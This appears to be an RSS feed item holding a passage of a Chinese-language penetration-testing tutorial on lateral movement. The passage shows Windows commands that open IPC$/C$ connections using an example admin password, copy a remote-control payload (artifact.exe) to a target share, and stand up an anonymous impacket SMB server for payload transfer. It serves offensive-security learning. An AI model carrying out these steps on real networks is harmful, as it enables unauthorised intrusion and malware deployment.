<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>横向移动 on mrlxl的知识库</title>
    <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</link>
    <description>Recent content in 横向移动 on mrlxl的知识库</description>
    <generator>Hugo</generator>
    <language>en-US</language>
    <lastBuildDate>Thu, 11 Dec 2025 00:00:00 +0800</lastBuildDate>
    <atom:link href="https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>横向移动姿势合集</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF%E5%90%88%E9%9B%86/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A7%BF%E5%8A%BF%E5%90%88%E9%9B%86/</guid>
      <description>&lt;h1 id=&#34;横向移动姿势合集&#34;&gt;横向移动姿势合集&lt;/h1&gt;&#xA;&lt;h1 id=&#34;横向移动姿势浅析&#34;&gt;横向移动姿势浅析&lt;/h1&gt;&#xA;&lt;h3 id=&#34;横向移动中的文件传输&#34;&gt;横向移动中的文件传输&lt;/h3&gt;&#xA;&lt;p&gt;横向移动之前，需要对攻击载荷和文件等的传输制定方案（当然，你使用c2的话当我没说）&lt;/p&gt;&#xA;&lt;h4 id=&#34;通过网络共享&#34;&gt;通过网络共享&lt;/h4&gt;&#xA;&lt;p&gt;可以实现局域网之间的网络共享，通过提供有效的用户凭据，用户可以实现两台主机之间的文件传输&lt;/p&gt;&#xA;&lt;p&gt;获取windows默认开启的网络共享：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net share&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241021142049383-65256384.png&#34; alt=&#34;image-20241021142048107&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;C$为C盘共享，ADMIN$为系统目录共享，IPC$共享需要提供可信任的用户名和口令来建立安全的传输通道&lt;/p&gt;&#xA;&lt;p&gt;实战通常选择IPC连接，该方法除了文件共享还能实现创建计划任务或系统服务等，而建立IPC连接的前提是：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;远程主机开启了IPC连接&lt;/li&gt;&#xA;&lt;li&gt;远程主机139或445端口开放&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;建立IPC连接：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use \\192.168.111.131\IPC$ &lt;span class=&#34;s2&#34;&gt;&amp;#34;Admin123456&amp;#34;&lt;/span&gt; /user:&lt;span class=&#34;s2&#34;&gt;&amp;#34;yuy0ung\administrator&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241021144154440-490057327.png&#34; alt=&#34;image-20241021144152556&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;列出远程主机C盘共享文件：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; \\192.168.111.131\C$&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241021144243429-619286692.png&#34; alt=&#34;image-20241021144241792&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用copy可以在两台主机之间相互复制文件，这里我向目标主机上传远控exe：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;copy&lt;/span&gt; artifact.exe \\192.168.111.131\C$&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241021144540829-359853067.png&#34; alt=&#34;image-20241021144539088&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;建立其他共享连接命令类似如C$连接：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use \\192.168.111.131\C$ &lt;span class=&#34;s2&#34;&gt;&amp;#34;Admin123456&amp;#34;&lt;/span&gt; /user:&lt;span class=&#34;s2&#34;&gt;&amp;#34;yuy0ung\Administrator&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241021145453410-380784067.png&#34; alt=&#34;image-20241021145451673&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;搭建smb服务器&#34;&gt;搭建SMB服务器&lt;/h4&gt;&#xA;&lt;p&gt;可以尝试在公网vps或受控内网主机上搭建SMB服务器，将需要传输的文件放入SMB服务器的共享目录并指定UNC路径，让横向移动的主机能够远程加载共享文件，有两点需要注意：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;要使用SMB匿名共享&lt;/li&gt;&#xA;&lt;li&gt;该SMB服务器能够被目标主机访问&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;在linux系统上可以通过impacket项目中的smbserver.py搭建SMB服务器&lt;/p&gt;&#xA;&lt;p&gt;搭建一个名为yuy0ungsmb，共享目录指向&lt;code&gt;/root/share&lt;/code&gt;的SMB匿名共享：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /root/share&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python smbserver.py yuy0ungsmb /root/share -smb2support&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 或者&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;impacket-smbserver evilsmb /root/share -smb2support&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241025175218050-202283514.png&#34; alt=&#34;image-20241025175215021&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;从 SMB server 下载文件&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;copy \\192.168.111.128\yuy0ungsmb\file.exe file.exe&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上传文件到 SMB server&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use x: \\192.168.111.128\yuy0ungsmb&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;copy file.txt x:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use x: /delete&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;使用-windows自带工具&#34;&gt;使用 windows自带工具&lt;/h4&gt;&#xA;&lt;h5 id=&#34;certutil&#34;&gt;Certutil&lt;/h5&gt;&#xA;&lt;p&gt;certutil用于管理windows证书并作为证书服务的一部分安装，其提供了从网络中下载文件的功能：&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
